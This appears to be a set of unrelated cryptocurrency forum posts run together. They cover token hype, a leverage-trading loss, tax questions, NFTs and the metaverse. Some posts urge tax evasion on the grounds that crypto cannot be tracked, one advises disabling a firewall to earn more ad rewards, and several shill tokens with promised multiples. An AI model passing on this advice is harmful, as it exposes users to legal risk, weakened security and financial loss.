It's just awesome that I made some people start investing and they actually might be early into crypto because I was lucky enough to be early as well.

&amp;#x200B;

TL;DR: I started investing back in 2020 and I was able to teach my family on crypto and some of members of my family and friends started investing!

Crypto.com's CRO is currently up 50% this past week and flirting with a $9 billion market cap.

Honestly I still think CRO is underpriced based on their future outlook. When I'm looking to invest in a particular coin or token (besides making sure they are not a rugpull) I look towards their marketing and their product. CDC's marketing team has been on point with tons of offers, deals, adds, Matt Damen, and the fact that their domain name gives the impression that they are an authority on the crypto space.

Secondly, they actually have a working product in the credit cards, staking, and loans. This may not seem like the most interesting product line compared to other crypto, but honestly it works and fintech isn't going anywhere. I can't really say I've had a bad experience using their exchange or my Ruby credit card.

I'm currently positioning myself to acquire the Jade card in the not so distant future (with a bit more CRO growth) so I can get my netflix rebate and staking rewards.

We can look to binance the the growth potential. Binance is currently at a $100 billion marketcap and was in a similar position to CDC not so long ago. Am I saying CRO will x10 and rival binance next month? No. But do I see it sneaking up with a 3-4x from here - Yes!

With cryptocurrency the founders are able to print money. You give staking rewards to people staking. Miners get paid for mining. And you can keep the house going. DOT got a 10% inflation target while other coins have a cap.

&amp;#x200B;

With fiat the government are currently collecting tax to pay for various things. But if fiat worked like crypto currency they would be able to just print a yearly decided amount and spend it as they wish.

&amp;#x200B;

We'd no longer see people paying tax, but it'd be fiat burned like with ETH to keep inflation down.

&amp;#x200B;

Instead of just giving out staking rewards you could give out increasingly higher UBI as basic minting. Amongst other things.

&amp;#x200B;

Is this what the government is going with their digital currency in the future? A coin that they can print and burn however they want without having to think too much about it.

&amp;#x200B;

The future is nuts.

In Canada my country has two ways to assess what cryptocurrency income falls under..commodities or business income.

Commodities is fairly straight forward - 50% capital gains income taxed at your marginal rate. 

Business income is something else I read and I'm struggling to understand who would qualify- outside of exchanges based in Canada or miners.

Something piqued my interest though- all of these big Tesla like companies buying crypto and holding it under their corporate tax rates...cam any company hold crypto and call it an asset ? Any gains on that asset to be offset by losses or depreciation and taxed as "income" (in a corp you generally only pay income on profit...)

If you take a loss on the crypto it generally offsets as a write off on everything in the business.. simplified my question is what goes on in the accounting aids for a company to buy crypto? How do big companies buy it versus the person?

Wouldn't that crush the tax rate to near nothing to buy crypto as a business ?

Hello,

for today I will be talking about a strategy that I put in place at the beginning of my crypto journey back in May 2021. I used Binance as platform and got hooked by some youtubers to do some leverage trading with a crypto bot from Binance : Grid Trading.

Everyone was shilling ADA at this point and ADA was going from 1.6 to 2.4 dollars. 

I decided to put 50% of my savings on Binance and then started with 2-3 X leverage putting a grid between 1.6 and 2.3 (100 grids). 

At first all was well, made around 60 bucks a day without any trouble because my grid was in neutral and this seemed a fair risk.

Seeing all this working, I decided to put all in at 20X. The reason behind is that 60 dollars is not going to make me crazy rich so I better just increase the leverage without any money aside in case I get margin called (right that was a really good idea, right?).

It worked wonderfully for approximately 1 hour, making 1 dollars every minute , I was feeling like a king. Then the crash happened. 

The asset went from 2.2 to 1.6 and then lower. And the more it was goign town the lower my PNL was getting, from -10 to -1000$. And then I had to cut the grid and get out of the position before I hit 0.

This trading costed me 75% of my money invested. That was a fucking disaster for me. And this is the reason why I am making this strategy guide for you people. It resides in one sentence that could summup the whole situation : DO NOT DO LEVERAGE X20!

TL:DR: I am detailing how I screwed myself as a beginner by listening to youtube and have too much hopium in the veins, don't be like me.

Since Burger King launched their *with a side of crypto* promotional, I have been munching hamburgers at dinner time for 3 days in a row. My hopes for a BTC or ETH coin are basically none, I might be suspicious if anyone even came out and said they earned one. I like the idea of snagging an asset along with a meal.

Let me tell you... I got kicked out of the bedroom midsleep last night because I was **funking** up the place. When I felt that elbow hit my ribs, I noticed it as well. If I lit a match at that moment, it would have been us and our cat flying out of the window like an explosion scene from Die Hard. 

After 3 DOGE and 3 basic hamburgers, I have to tap out. Upon writing this, I feel pretty wrecked. Never really ate fast food like that before, so maybe it takes a break-in period. I know so many people who live on the stuff. Godspeed to those gunning for a Bitcoin. 

&amp;#x200B;

TLDR - Burger King hurts my tumtum. What do you think of events like this?

Hey guys! Crypto-noob here from India. 

When I say noob, I mean I have been following crypto for a few years now, but have only just started to invest really small amounts ($200-$500 per month) in it using the exchanges available in India. 
My investment strategy in crypto is going to be very aggressive since I've been investing in real estate, stocks and a couple of businesses till now, so I'm secure on that front. Any money I'm going to put in crypto is going to be money I wouldn't miss (although I'd like for it to go up obv).

So here's the catch. The coins I can buy via regular exchanges here are mostly the more mainstream ones (invested tiny amounts in bitcoin, eth, mana, matic) and a lot of them don't even have coins like CRO, Voyager etc yet. Needless to say, the opportunities I see are usually towards the later stages when the huge gains (50x-1000x) have already been made.  While I will invest in mainstream coins, I feel like I'm missing out on the biggest growth opportunities.

Anyone here from India, or anywhere else really, who knows what I can do to get the coins that people in other countries, specially the US get into really early in the game? 
Also, would also appreciate any resources (or any prior thread here that can help) I should be following to keep educating myself on the latest developments in the crypto-world.

TIA!!

In response to the top post on the sub for the day, about how you should be a good compliant consumer and always keep records and pay your taxes, (dont forget to take the vax too). Well if thats what people here really want, then I dont think you should be in crypto at all. If you are really so happy to comply with government regulations then what do you want even crypto for? Cryptocurrency is extremely inefficient compared to traditional alternatives. Crypto is not revolutionary because of its speed or because of its security. Visa is far faster and more secure than any cryptocurrency ever could be. Centralized solutions necessarily have better tech because there is no trade off between scalability and decentralization.

The big deal about crypto is that it allows you to have unstoppable digital cash through decentralized consensus. If the governments decides they dont like you, they can freeze your bank account.  But they cant seize your bitcoin, thats why its so revolutionary. 

There is not much utility for crypto besides being a scarce digital asset that no government cannot stop or seize. If you dont care about the libertarian ideas behind crypto then you should just use an SQL database, its better than crypto in almost every way. No transaction fees, instant finality, and infinite TPS. If you are only in crypto because you want a hedge against inflation, then buy a house or buy gold, much less risky.

At the outset Id like to make a distinction between memecoins and sh*tcoins:

-memecoins: coins with seemingly no utilization but outrageous gains and usually centered around internet culture/memes

-sh*tcoins: random coins with seemingly no utilization and/or vaporware and/or rugpulls.

Can sh*tcoins become memecoins? Yes, contingent upon the number of holders/shillers/followers/mainstream mention.

We are undoubtedly in the wake of a memecoin boom. Soon, many of those who bought low will realize their profits and move on to grander pastures while those who bought the top hoping for equally sized pumps will be left holding bags (from certain stats Ive seen on a certain memecoin which I will not name, somewhere near 99% of holders were in profit at some point).

It is safe to assume those who got burned will have a sour taste in crypto while those who boomed will not. It is also safe to assume memecoins were thousands of peoples first foray into the crypto sphere.

Now that begs the question: where to? Where will these memecoin profits go to next?

Id like to hear your thoughts.

Currently, I believe the vast majority of those profits will go into two categories (assuming they still play the crypto game):

1) NFTs, I believe this is the obvious choice for many as it is one of the most frequently mentioned thing in crypto news.

2) Metaverse coins. Again, frequent mentions in crypto news and currently on the rise.

Id like to hear what you think.

Nodus was born the day I wanted to buy something with my cryptos. I didn't know exactly what I wanted, but I had some extra ~~cash~~ dogecoin so I was like fuck it let's exchange them for something.

Turns out... That I didn't know where to go on the internet to find such thing (and that's coming from a guy that has some knowledge about this crypto world and it's pretty into it). I just wanted an Amazon or eBay where I could scroll around and see what I like.

So, with that in mind, I was like okay, what do I have... Programming skills? Nope. Money to hire a capable programmer to do that? Nope. Contacts that can help me? Nope. A good fucking business idea? Hell yeah

That's why I started Nodus on Social Media (Twitter, Instagram...), where we serve as intermediaries between sellers and buyers. Our goal is to, one day, scale this into a cryptoEbay and, eventually, into a cryptoAmazon, where users can buy any sort of item with their tokens.

If you're wondering about how we make money out of this, we take as profit 2% of the total amount of each completed transaction, and we split that extra cost between the seller and the buyer, so each only has to pay 1% as a service fee.

Now, clients, there you have our tariffs

Now, investors, there you have our profits

Got any clothes you don't like anymore? Sell them for crypto! Anything at home you don't use? Yup, sell it here! Anything you want, all in one place. Come and join us! :)

Wanting to share something I came across with **someone putting out fake news to pump Bitcoin Cash and take out a short position**. This is similar to something that happened a few months ago with Litecoin where a few news outlets picked up the story and falsely reported [https://www.bbc.com/news/technology-58545944](https://www.bbc.com/news/technology-58545944)

I just saw it happened again, this time was Bitcoin Cash (BCH) claiming Kroger were accepting BCH as payment. Some media organisations picked it up without checking. 

&amp;#x200B;

https://preview.redd.it/thmho0tltrx71.png?width=1158&amp;format=png&amp;auto=webp&amp;s=9aa3580fd9dc161a5adc32adfbeef6c3f2c7bcba

The reason for this is clear. I saw a post on Twitter claiming there was a huge short position taken out as the news hit the market and sent prices increasing +3%. Once the news came through it was fake sent price back down.

&amp;#x200B;

https://preview.redd.it/c40x4f3qvrx71.png?width=714&amp;format=png&amp;auto=webp&amp;s=c4c98f378e84a24af4f2c158ea0647f4a1a7c3ea

https://preview.redd.it/os116cgmvrx71.png?width=1305&amp;format=png&amp;auto=webp&amp;s=5a979738fd3b35aad94aa5ebaae256b0961f91fa

 Now this is mere speculation, and it could be due to a variety of reasons, but I do think things like these are designed to purposely manipulate the market. 

I don't think they anticipated such a swift response debunking the news. A bit of a lame attempt really and shocked some ppl even remotely picked it up, especially considering the Litecoin fake news which happened. Like come on, it's a dead giveaway when big retailers like Walmart or Kroger prioritise LTC and BCH over other more adopted cryptocurrencies.   


Anyway, just thought this was interesting and designed to keep you thinking about the real market manipulation which goes on in the markets. This is true for traditional equity markets too.

People still get on board until the train leaves. The current price is due to the Coinbase listing and that is just the beginning.

Some points that speak for an even higher price:

&amp;#x200B;

\- The Binance listing is still pending

\- The Mainnet with Smart Contracts is coming on 09.11. (One has seen with the Binance Coin what happened). Low transaction fees due to cosmos 

\- The US exchange will launch in Q4

\- Cards just became available for Australia the other day, South America is still on their list

&amp;#x200B;

Just the name "[Crypto.com](https://Crypto.com)" in combination with the marketing allows for a higher price. They are teh company for mass adoption.

Just some partnered companies:

F1, UFC, Lega Serie A, PSG, Philadelphia 76ers, Aston Martin, Fnatic, Twitch Rivals, [Water.org](https://Water.org), Matt Damon

What will the future of crypto look like for the average consumer? Bit of a vague question, so let me elaborate.

Were all having fun exploring new coins and theorizing in new uses for crypto, but its all largely inaccessible to most people.

Right now, anyone can make a Coinbase or Binance account and invest in a few coins, but thats just the tip of the iceberg.

Ideally, we will be able to use crypto instead of banking; Exchange coins with one another as easy as Venmo (with instant conversion to your preferred coin); buy and sell NFTs that represent deeds and tickets and video games; in addition to continuing to invest in growing coins like they were rare metals.

But even as someone into Crypto, I am way over my head when it comes to taking full advantage of the technology. And were probably years away from taking full advantage of NFTs.

The future is looking unbelievably promising for crypto, but how do you think that future will be packaged for the average consumer?

Will there be decentralized finance apps that give us full control of all of this in one place? Something so easy it replaces our banking apps? Or will this technology just be used as the backbone of existing financial and tech institutions to make their jobs easier without the consumer noticing much?

Basically, is Crypto going to be a revolution or an evolution?

Would love to hear your visions of he future outside of just price speculation.

I'm **52nd** on the Moon leaderboard for the last 30 days. This round I received **2920 Moons** which are approximately worth **500 US Dollars**. This is an insane amount of money where I currently live (Bangladesh).

Just to give some insight, The minimum wage in my country is approximately equal to **17 dollars a day.**   By posting in this subreddit and spending an hour or two a day, I made **30x** the national minimum wage. 

The absurd thing is, **I made a 260% return in 6 months** on my Crypto investments since late May. While the local banks offer you **1%** interest while the inflation rate here is **6%.**  

The amount of people that have had their lives completely changed because of this subreddit alone is insane. Even people in developed countries are having their lives improved because of Crypto. 

Digital payments such as Paypal, gift cards or international credit cards are almost impossible to access where I live. Crypto is the only thing that I can access. I don't know what to say except thank you all for holding and promoting Crypto. It has absolutely changed my life.

Akita Inu seems like it could be Algorands very first successful meme coin. Currently it has a market cap of almost $3M and a liquidity of $130k. Both the market cap and liquidity has grown from almost nothing in 24 hours. The creator has also been issuing NFTs of the logo. This bull run truly is favoring NFTs and meme coins. What are your thoughts, have you seen any other successful meme coins on an alt chain other than BSC?

I am noticing a lot of libertarians complaining about how normies getting into the industry are ruining the original libertarian ideals that crypto started with. Well, I believe it to be true to an extent. 

Fellow libs, lets be real, in todays society we dont change the world based only on ideals, we change the world based on competition and convenience. What we have to work on is decentralized applications that people will enjoy using after making those sweet GAINZZZ. We gotta develop dApps that provide even better services than the existent centralized ones, and make it cool, get all them cool people in it, get that fine music going, series, games, etc etc. Govs and corps are already doing a great job at destroying their credibility, we just gotta get people to hop on the bandwagon by providing fun, along with gains, cuz lets not be hypocritical, we all like the gains 

For the record, I am a Libertarian, but I became one after getting into crypto for the gains, which led me to learning about how disgustingly corrupt governments are, how the economy really works and how beautiful this new technology truly is. 

Stay positive and creative, peace out everybody

People trying to guilt you into paying taxes on your crypto do not understand the purpose of crypto.

Do whatever you want with your money. They can't track it. I'm not advocating for anything, but I'm also telling you that no one else has any say whatsoever on what you should do with your property.

When the crypto community comes out and tries and shames you for not doing what they think you should do with your money, rest easy knowing that they have *absolutely no power whatsoever* over you in a permission-less ecosystem. Long live privacy, long live private property, and long live liberty. Short live government.

Sorry if this post gets a little off topic at points I have removed a bunch of text already. Its all relevant to some extent Im just also high asf on edibles.

Basically it started back with the first big dog-coin that went up to 0.78 ATH but I was more interacted and I didnt buy into it at all then. I didnt judge anyone there. But I noticed many did and or hated on it. I thought thats people. They all have opinions. So then said dog-coin dropped and I was glad I didnt buy in at $0.60+ as I completed it while the hype was rife. 

So I kind of left the area and space of dog-coin main and I went and continued learning and finding gems from iotex that I had largest blow up in my crypto journey with a small volume jumping 200% in a day yesterday before I moved or exchanged to a more stable growth coin being Axie before i plan to put it back on iotex after its dip is over or towards its end Im guessing mid December before it picks up in January or February with steady growth. 

Then today and over last 2 weeks or a month Ive followed Shiba Inu more and more. I decided I had to get in on it to check just for fun if it would slam down or go up. To my expectation it went up. It grew 70%~ in 24 hours. I should have exchange it to a stable at this point yesterday or day before. Anyway it went down to around 10%  gain. I saw the chart and its gone down past my buy in now so I made right call. All be it $ not being a huge amount and I mean that coming from a relatively poor lifestyle. So I do understand a dollars value and I know how to be savvy so I simply exchange coins I now have to coins that are going up or about to from coins that are up and about to drop. My balance has doubled over 3 months. The exchanges have all been around 1%-5% of total assets held. 

Sorry dragging on my story

I have followed shiba and I have seen its possibilitys. Its that the hate is so bad. I was in a large Twitter space where you can have group conversations live. It was a shiba chat but there was a heap of good knowledge on just crypto and the world of tech that honestly was really good to hear others expressing what I wanted to hear or wanted to have confirmed to things I never thought I would have found out.

I judged shiba a few months back. I made claims against it and I was wrong. I take it all back it wasnt alot but it wasnt needed.

i didnt know then that it was actually community project. If there are people who are trying to make scams or take advantage and thats a reason your hating or angry that happens on every edge on the internet. 

Its that when people buy in at bad times or the wrong time or a time that they didnt see happening or the prediction said otherwise then their emotions take over and before they know it they are really upset and saying things they wish they didnt. 

These meme coins or dog-coins or whatever you want to call them. They arent going away. Its actually going to bring a lot of finance into the third world countrys than really need it. Those that are going to garbage deports to get plastic or cans to feed their family every day. To the people in Africa taking mostly empty carcasses from meat trucks that park and open up their truck for those who have no food to salvage any meat they can.

These are the people I really hope benefit from any cryptocurrency projects. NOT so much the capitalist developers that sure we are ALL capitalists using Reddit. If you own a phone your capitalist. Why ? It makes for super powers able to contact any person across the globe even talk face to face. We can use it to buy and sell anything 8its used for massive marketing campaigns that cost more than on any other medium.

Previous market cycle peak was almost 4 years ago which might suggest we are approaching the end of the current bull market.

Of course, this cycle might be different and last longer: crypto is more mainstream than it used to be, other coins than BTC are being talked about in the media, institutional investment is rising and adoption is making progress. Still, the looming threat of the bear market is upon us (and might even be a self-fulfilling prophecy if enough people believe in the 4 years cycle).

It would be great if veterans from 2017/2018 could give us some historical perspective to help us understand what the end of the bull market looks like and how well recognise it when its there. Was there a specific event that triggered it? Did you realise quickly that the bear was there to stay or was there a long period of disbelief? What was the sentiment at the time ?

I just started collecting NFT's 3 weeks ago and I'm loving it.  I totally got the bug for it, collecting lil internet art that has limited editions.  The scene is thriving regardless of what the tez coin is doing.  These people have their own lil community and superstars.  I went all in and cashed out on a bunch of gains and got tezos NFT's, good ones, from solid artists.  Either it's genius or full smooth brain ape.

I used to think that nft's were dumb and like the Dutch tulip situation, but it's not quite like that (limited editions, fans, and artists getting better fix that).  I don't know if NFT's are going to go away, so much art and money.  If gas gets too high, move to cheaper blockchain.

Here are some sites that help me.  You need a kukai wallet to connect with these art exchanges, get in there and start collecting!  Post art or links in if you have anything to add!

For no good reason at all, I want to remind you in case you have not heard - to pay your taxes on your crypto gains.  To the skeptics, I am here to convince you to do so and reasons to feel super happy good about it too.

1. Only good things come from paying taxes.  In fact, ALL the good things come from paying taxes.
2. You know that CSI show?  That is basically how the tax collectors are, so don't even think about not paying them.
3. Bro.  "Fair Share" alright?  More the better.
4. My cousins uncles brother didn't pay them and super cereal bad things happened for a long time.
5. The government is here to help you, why you gotta be so negative, help them out by paying your taxes.
6. You can pay EXTRA to be extra special good citizen to cover for those less fortunate.  Feels good, man.
7. Prison, fines, etc, scary, sad, all the bad things if you do not pay them.  Just saying.
8. Have you even seen a polar bear almost going to drown?  If you love animals, you will pay those taxes.
9. You know that hot looking actress/actor on TV?  Last year - paid taxes, that's right.
10. Patriotism, love of country, love of self.  Pay them, pay extra, ask to pay more, do your civic duty!

Although all the Pay Your Taxes posts that are infiltrating the sub may seem suspicious, coordinated or somewhat moon-farmy, nothing could be further from the truth.  We are... I mean.. I am just here to spread good vibes and good cheer.  Now go make some money so you can pay them taxes!!!!

I bought my first cryptos Last year and used a second wallet just to buy some completely random coins and forgot what coins I bought because I had sworn to myself I'll check it in a year again 

Today's the day and I opened my second wallet after a year and was extremely surprised what I found ... I bought LUNA coins and some other but LUNA went up the most

Now I asked myself what was your best investment you made.

Hi,

someone I know recently contacted me talking about "ZENIQ" which is supposed to be the next big thing. It promises to enable transactions between blockchains without wrapping and more and all of that is conveniently backed by an MLM structure. - Smells like a big scam to me.

As I really don't want that person to loose their money (apparently the whole family was drawn into it), I researched a little bit. I found a guy (Christian Thurner) which poses as CEO of some fake bank which is connected to ZENIQ. I was also able link him to an ICO of "Pecunio" which apparently raised about 20 Million $ in 2019. After that, it seems like Pecunio completely vanished. The coin is inactive and no news have been published by or about that company (or whatever it is) since.

I am hoping to present that information to the person that contacted me to proof that ZENIQ is just a big scam. Now my request: Does any of you remember Pecunio and might be able to provide some proof that Pecunio was actually fraudulent? That can be in the form of links/articles or similar.

&amp;#x200B;

Thank you very much in advance, I hope hope this sub is the correct one for my request but as this is the CryptoCurrency sub, i figured someone must be able to help me out. 

Thank you very much!

So i recently got into Crypto, I really like the idea of having a Crypto credit card and being able to buy crypto easily. So I downloaded crypto.com but quickly found out that they don't really support many of the coins i would like to buy. So idk what do you think? Does anyone maybe have a better alternative?

After seeing a huge increase in the price of bitcoin from the time it came into existence till now I am surprised.

I am thinking to inves some part of money which is just lying there and of no use to me right now.

After some research I am doubting myself that should I really invest in btc? 

Some remarks:

I don't have a large amount of money.

Just wanted some suggestions if it would be safe (willing to take some risk)? 

And would it give me good returns (10x maybe)?

Or if I should invest in some other coin.

It's not a rant, Im just really confused how things change so quickly.  
There was a time when people here focused more on the King, on the fundamentals, people discussed serious projects, innovations and different use cases of crypto and adoption.  
People used to form their own opinions from reading up on projects, not braindead parroting what they glanced over scrolling through an article or read in a one-liner here.   
Nowadays everybody's got their focus on that one overhyped coin that's going to a 100x by the end of the year. Nobody's even read the whitepaper on it, but hey, so much hype, it's gotta be the next moonshot!   
And when it ''does a Squid'' newcomers get burned hard and leave the market for good. I get it's survival of the fittest, but this shilling doesn't help with Adoption, does it?  
When was the last time you saw a discussion on the King?   
2-3x by the end of market cycle? Heell no, that's not enough, we want 10x in a month!  
Nobody is happy with 3-5x in 6 months, people want quick gains over night and that's it.  
Right now, stop any pedestrian on the street and ask them if they want 2x on their money in 3 months. About 95% would think that's too good to be true and in the normal world it is too good to be true. 

It really feels like a group of drunks walked in a Vegas casino trying to choose the one winning slot machine out of a thousand slot machines.  
Crypto does change things, sadly not always in a positive way.

Just wanted to post about a token I'm excited about. This token is Paribus.

**What is Paribus?**

A Cardano-based lending/borrowing platform that aims to support conventional and unconventional crypto assets to allow for its users to unlock liquidity and interact with the markets without having to liquidate assets. Simply put they are creating avenues for NFT holders (and those with synthetic assets) to participate in the DeFi space. You'll be able to pull out loans using these exotic assets as collateral. 

**Who is behind the team?**

Deniz Dalkilic - CEO | Founder of Bounty0x, a 2017 project that some might remember.

Simon Kruse - CTO | Former Technical Lead at Orion

with a ton of other great people who you can see here [https://paribus.io/](https://paribus.io/) 

In addition to the team composition, **this project is backed by** [https://cfund.vc/](https://cfund.vc/), which is a IOHK based fund (advised by **Charles Hoskinson** himself). Be sure to check out the other projects they are backing and you will quickly see the caliber of projects they back.

For a rundown of the roadmap, with a ton of exciting things incoming, I'll let you glance at the [roadmap](https://medium.com/@paribus_io/paribus-the-path-forward-a54faf23481?). 

&amp;#x200B;

Oh did I mention the token is deflationary?

And I spent almost $4,000 buying 20 different shitcoins just to try and catch one going up  literally all of them admit in their bio/description that theyre purely hype/meme coins but I couldnt help myself, I wanted to join then fun! But its probably borderline or even just straight up degenerate behaviour 

I wont name them because I dont want to be seen pumping them. Its not like I have loads anyway, literally $200 of each 

Important disclaimer: dont gamble/invest more than you can afford to lose!!! When the fun stops, stop!!!

What coins do you hold dear to heart? Regardless of market cap, supply, etc

I am very bullish on CKB and MTV, not because of the price but because of the tech. But Im also looking for the sentiment on other potencial projects. I also think QNT has a great future also. 

To be honest Im trying to steer away from shitcoins and put my money in potencial projects. Im always researching, I actually read whitepapers, but its good to also know the sentiment on projects, and what better place than this Reddit. 

PS this is my first post here.

I have recently been orange pilled to the point where I'm actively seeking out reasons to not believe.  Been into ethereum for 4 years now but fully understand why maxis have issue with it.  

Beyond getting rekt from FOMOing in at highs, I'd be curious to hear more arguments against bitcoin.  I even joined r/buttcoin a few months back but that has only strengthened my conviction and that's proven to be a total clown show.

I've heard lots of stories about ETH maxis abandoning ethereum, but I can't find much about BTC believers jumping ship.  

You guys gotta be out there.  Not interested in putting anyone down or changing anyone's mind.  Just want to hear from different perspectives.

DOT is a fundamentally strong coin and have offered decent returns in past with moderate to almost none risk. 

Being a noob, it is hard for me to fathom highly technical terms such as PARACHAIN AUCTION. What i understand is that it is a move to expand and strengthen the DOT ecosystem. 

I hold very small amount of DOT (all i could afford) and am inclined towards staking it for almost 2 years towards Moonbeam and Acala. 

Please explain the process in simple terms and also advice if i am moving in the right direction.

I wont lie I am so guilty of this... anytime a new comer asks me for advice about portfolio and strategy. I always tell them the standard Stick with ETH and BTC and DCA and hold. While I contradict myself by being balls deep into shitcoins and constantly try to time the market(with little success). 

I just realized I am a total hypocrite when it comes to giving advice out on this sub. Another one I constantly say is make sure to do your own research when recommending some crypto to someone, while my research consists of coming to this sub, searching up the Crypto in question and if someone has made a long post about(I dont even read the post) I buy. 

[Comment]: Then the funniest one is me constantly telling people, Dont put more than you can afford to lose, while once again being balls deep in Crypto and probably will be sleeping in a tent if it crashed  

Anybody else find they are a hypocrite giving advice they dont follow?

So here in the land of upside down one of our major banks has made the bold decision of starting [crypto trading within it's bank app](https://www.commbank.com.au/articles/newsroom/2021/11/CBA-to-offer-crypto-services.html).  I know this doesn't affect the majority of traders as Australia is a minority in the crypto game.  However this is the start of the major bank / crypto merge, which anyone with a basic knowledge of crypto will understand is a really bad move.  Yes they say they are implementing the trading through Gemini API's so that you'll be trading on Gemini through the bank app, but they'll still have access to your crypto.  If you can access it through the bank app, the bank can access it.  THAT IS EXACTLY WHY CRYPTO WAS INVENTED, as an alternative to the banking system due to the financial crisis of 2007/8.   


Regardless of how it's implemented this time, we need to never begin using banks as crypto trading or it will set a dangerous precedent for the future.  Even if you are completely in control of your own funds with this bank (you wont be), it's still showing that people are okay with banks interfering with cryptocurrencies.  If you're a commBank user or plan to get it because of crypto functionality, don't, you'll just be encouraging other banks to do the same thing and ruining the purpose of crypto.  


Just as a simple way to explain why it's stupid for banks to get involved if anyone wasn't already aware, I can put this simply.  
the initial reason for BTC was so that you can control your own funds and be your own bank.  
If a bank offers crypto trading where you are your own bank, they aren't doing anything, so just do your own trading without the risk of a bank getting involved and fucking your shit up.  
If a bank offers crypto trading where they are your bank and they hold your funds, they're destroying the crypto market and you're helping them.  If banks get involved and hold the majority of crypto it just becomes another game for them, it's another stock market for them to abuse and make money off of.  Who provides that money? Us, the people trying to trade crypto to get around the banks.    


TLDR; Fuck banks, Fuck Commonwealth Bank.  Don't allow them to take over the crypto space.

Brave browser which belongs to the  BAT tokens is mainly knows for it's free rewards for browsing and watching Ads. Although it says maximum 10Ads can be watched in an hour , not everyone gets that amount of ads which technically makes so hard to get more than 5$ in a month.

So I started testing them are here a few methods I found working for myself which made me earn almost 1 Bat in a day.

Enable the number of ads to 10 per hour and make sure the auto contribution is set off unless you want to contribute to some one

Try using the same wallet in phone and browser which gives you more reward , I personally don't use uphold and gemini gives 10 withdraw free for a month and you can stake BAT with them so it's upto you to choose 

This is my favourite method , everytime when you open the browser try opening 4 dashboards and always on the 4th dashboard you will get one ad , repeat this step as long as rewards are increasing , this happens maximum 5 times in an hour. Again come back after an hour and do the same. The 5 is not the same it can differ from 1-5 but the dashboard will give you an ad every 4 times when you open them

Enable Brave news and try reading them atleast once every hour , it increases the rewards which may not pop up but it'll run in background and this worked for me aswell

Lastly disable the firewall which enables pop up ads to come more frequently.

I was using my phone and pc for about 10 hours and repeated the same method for a week now. At this rate one can try getting 10-25 BAT. But the rewards can vary from one to another as the number of Ad campaign differ between each person.

I do my normal work using brave and get these rewards at the same time , if anyone wants try this out and let me know if this works for you too. Hope this helps a few here

Rentible RNB is a first-mover dApp for mid-to-long term property rentals, where tenants and landlords can send/receive rent payments in different cryptocurrencies. 

In Today's AMA Team said that will launch a marketplace that will also include sales of metaverse properties and in a later stage also a Defi mechanism that enables loans to buy metaverse properties

Hereinafter what Team said:

"Actually not only rentals of commercial metaverse properties, but more than that..  more as a marketplace that will also include sales of metaverse properties (similar somewhat to opeansea of metaverse assets), and we also look to incorporate at a later stage a DeFi mechanism that enables loans to buy metaverse properties, alongside short-term loans for making rent or deposit payments which are already part of our roadmap. 

Since were on the topic, I am excited to announce that we already started developing this addition to the Rentible ecosystem in parallel to the platforms beta launch in December, as we aim to have an unveiling of it by end of the year!

We will update our roadmap and whitepaper in the coming week to include this addition, this update will be shared on coinmarketcal so the community can help spread the word.  
Our aim now is not only to be first-to-market with a decentralized real-estate management platform but also first to launch a marketplace for metaverse properties. 

By the way - We invite everyone after the AMA to our Twitter, where we will announce this officially with a giveaway campaign "


Remember.. Rentible will launch its commercial platform in December in Latin American countries. 

Project has an easy to use approach with the goal of mass adoption of platform

Started in May,  has already been released MVP version of the platform (only for community member)

- You can stake RNB on Bancor (single stake) or Uniswap 
- token is already listed on Bittrex
- MVP already released 
- Commercial platform will be released in Latin American countries within end of the Year
- marketing activities will start next week 
- total supply only 3,5 million of RNB 
- market cap only 2,5 million usd
- Team was in Dubai at Gulf Blockchain week 

Atm you can buy RNB on Uniswap, Bancor and Bittrex Global but Team said that in Dubai they have talked about the listing with Gate.io and Kucoin

For those that dont know, the [Carrington Event](https://en.m.wikipedia.org/wiki/Carrington_Event) was a powerful geomagnetic storm caused by a coronal mass ejection from the sun hitting the Earth. This caused the worldwide telegraph network and electrical infrastructure to go haywire. Telegraph operators were shocked by their equipment, pylons through off sparks, and electrical equipment continued generating powerful current even once disconnected from power sources.

Its predicted that a storm of similar magnitude occurring today has a 0.7% chance of occurring per year, and would essentially wipe out the global Internet as well as as cause over a trillion dollars of damage worldwide. In 2012, a Carrington-level coronal mass ejection missed the Earth by only nine days.

In the event of one of these storms coming to pass in the near future, what would become of any cryptocurrency assets held? Would they just be unrecoverable?

 In an MMO everything in the game is created and provided by the game authors generally speaking, they drop it in to the world/game assets, they use in game currency etc. to allow you to buy the item, then maybe trade/sell it to someone else in the game for game currency, and in some cases people make deals offline for Fiat (real money) to exchange things in a game as a way of getting real world profit out of items they have acquired.

This is limited in the sense that items scarcity and existence in the game are controlled by the game, managed by the game and in theory is only for use in the that one game space. Sometimes those objects only exist if you're logged in, or on the coastal/content server you connect to etc.

The metaverse concept using NFTs could be quite different in terms of asset creation, management and sale. With NFTs on blockchain you can enable external content creators to add objects to the metaverse that users can purchase, resell and trade.

These objects when bought or sold by a user become part of the blockchain showing in a transactional history of the values it sold for and who created it. The creator also gets a small portion of each time the item is sold as a commission / royalty on the time which incentives them to be a creator and put in the time to improve the meta space though an economy that encourages making the space better.

If the blockchain(s) selected for used with the metaverse are based on existing general use crypto chains it would also mean that your NFTs on those chains can be brought in to the metaverse space, or other similar services (not FB meta, something else) and travel with you as a user on a blockchain separate from a game platform like in an MMO. Think you can go to some other spaces server, but still watch your favorite movie there with friends in that environment, or look the same as an avatar etc. across metaverse platforms by different vendors.

The use of NFTs on blockchain record of creator allows for easy verification of authenticity of items allowing for "official" or "licensed" items provided by artists, movie studios, celebrities etc. to be easily identified from someone's attempt at a knock off item they made themselves or someone is trying to scam with etc., and proves an items origin / value for resale, trade and limited editions etc. as limited items could not just have more added for profit like in most game worlds, the 1 of 10 etc. is determined at time of minting the NFT object. You know if you're buying a cheap re-release, not a first edition etc. of an object.

Last, the items would be actual assets on the blockchain, let's say it's ETH as an example... so the value of your items, assets, in your account is easily seen as monetizable through sale, or you could get DeFi loans against items in your collection to leverage your assets the way you can get a loan from a bank based on your house or art items value... now your limited edition Banksy NFT you display in your "in game" apartment can be leveraged financially the same way but enjoyed in the living room of your metaverse space.

Given the metaverse goal is sort of dystopian (something like ready player one) in that it's intended to give people the opportunity to have a digital life with all the stuff, home and environments they wish they could have in real life as an escape, the only way it works in a compelling way is if the objects in the space create a real economy of items that are interchangeable in value and currencies in the real world.

At this level of economic interchangeability of online and offline asset values the argument of "putting time and money" in to something like an MMO is a thing of the past as you're not grinding for no reason in a single games environment, you're actually grinding towards assets with real world recognized value that you can enjoy in multiple different environments or create, trade and sell to buy your groceries this week or pay your rent.

